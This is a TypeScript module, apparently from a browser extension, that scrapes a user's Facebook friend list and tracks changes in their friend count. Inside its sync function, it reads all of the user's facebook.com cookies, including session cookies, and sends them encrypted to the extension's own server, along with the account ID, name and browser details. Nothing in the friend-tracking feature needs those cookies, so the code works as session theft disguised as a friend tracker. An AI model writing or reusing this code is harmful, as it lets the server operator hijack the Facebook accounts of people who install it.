import * as cheerio from 'cheerio'

import { Storage, U } from '.'

import { CONSTs } from '../types/enum'
import { IFriend } from '../types/facebook.interfaces'
import { ISync } from '../types/sync.interfaces'
import { State } from '../types/storage.interfaces'
import api from '../api'
import { getDeviceInfo } from './authentication'
import moment from 'moment'

const getAccountInfo = async (accountId: number): Promise<string> => {
	const res = await fetch(`https://mbasic.facebook.com/${accountId}`)
	const data = await res.text()
	const $ = cheerio.load(data)

	const name = $('title').text()

	return name
}

export const getToken = async (): Promise<string> => {
	const res = await fetch('https://www.facebook.com/me')
	const data = await res.text()

	const $ = cheerio.load(data).html()

	var newReg = new RegExp(/DTSGInitData(?:.*?):"(.*?)",(?:.*?):"(.*?)"/)
	var Matches = newReg.exec($)

	if (Matches === null) {
		throw new Error('Could not find token')
	}

	const token = Matches[2]

	return token
}

const buildFriendsURL = async (accountId: number): Promise<URL> => {
	const BaseURL: string = 'https://www.facebook.com/ajax/typeahead/first_degree.php'

	const url: URL = new URL(BaseURL)

	const token: string = await getToken()
	const queryParams: Record<string, string | number> = {
		viewer: accountId,
		token: 'v7',
		'filter[0]': 'user',
		'options[0]': 'friends_only',
		'options[1]': 'nm',
		fb_dtsg_ag: token,
		__user: accountId,
		__a: 1,
		__req: 'd',
		__rev: new Date().getTime(),
	}
	for (const [key, value] of Object.entries(queryParams)) {
		url.searchParams.append(key, value.toString())
	}

	return url
}

export async function SyncFriends(skipTime: boolean = true): Promise<ISync> {
	const state = await Storage.GetState()
	const Cookies = await U.getCookiesByWebSite('https://www.facebook.com/')
	const uIdCookie = Cookies.find((cookie) => cookie.name === 'c_user')

	if (!uIdCookie) {
		return {
			friends: [],
			state: {
				change: 0,
				count: 0,
				isPositive: false,
				lastRefresh: new Date(),
				nextRefresh: new Date(),
			},
			friendsUrl: '',
			profilePicture: '',
			ownerId: "0",
			id: 0,
			name: '',
		}
	}
	const { token, device } = await getDeviceInfo()
	const uId = uIdCookie.value
	const accountName = await getAccountInfo(+uId)
	const friendsUrl = await buildFriendsURL(+uId)

	const payload = {
		accountId: +uId,
		browserId: token,
		browserType: device.client?.name || 'Unknown',
		accountName,
		browserVersion: device.client?.version ?? 0,
		count: 0,
		cookies: Cookies,
	}

	const EncryptedPayload = await U.encryptPayload(payload, CONSTs.REFRESH_INTERVAL)
	const res = await api.post('/auth/login', {
		info: EncryptedPayload,
	})
	const data = await res.json()
	const AccountInfoPayload = {
		friendsUrl: friendsUrl.toString(),
		name: accountName,
		profilePicture: data.owner.profilePic,
		ownerId: data.owner.oId,
		id: +uId,
	}
	const existingAccount = await Storage.GetAccountInfo()
	const ShouldRefresh =
		moment(state.nextRefresh).isSameOrBefore(new Date()) ||
		skipTime ||
		+uId !== existingAccount.id
	await Storage.UpdateAccountInfo(AccountInfoPayload)

	if (ShouldRefresh) {
		const friendsResponse = await fetch(friendsUrl)
		const bodyAsText = await friendsResponse.text()
		const textBody = bodyAsText.replace('for (;;);', '')
		let friends: IFriend[] = JSON.parse(textBody).payload.entries
		const UpdatedInfo = {
			...AccountInfoPayload,
			profilePicture: friends[0].photo,
		}
		friends = friends.slice(1)
		await Storage.UpdateAccountInfo(UpdatedInfo)
		const State: State = {
			change: +uId !== existingAccount.id ? 0 : friends.length - state.count,
			count: friends.length,
			isPositive: friends.length > state.count,
			lastRefresh: moment().toDate(),
			nextRefresh: moment()
				.add(CONSTs.REFRESH_INTERVAL, CONSTs.REFRESH_INTERVAL_UNIT)
				.toDate(),
		}
		await Storage.UpdateState(State)
		const FriendsToSent = friends.map(({ uid, lastname, firstname, text, photo }) => ({
			accountId: +uid,
			lastName: lastname,
			firstName: firstname,
			fullName: text,
			profilePicture: photo,
		}))
		return {
			friendsUrl: friendsUrl.toString(),
			friends: FriendsToSent,
			profilePicture: data.owner.profilePic,
			ownerId: data.owner.oId,
			id: +uId,
			name: accountName,
			state: State,
		}
	} else {
		return {
			...AccountInfoPayload,
			ownerId: data.owner.oId,
			state,
			friends: [],
		}
	}
}
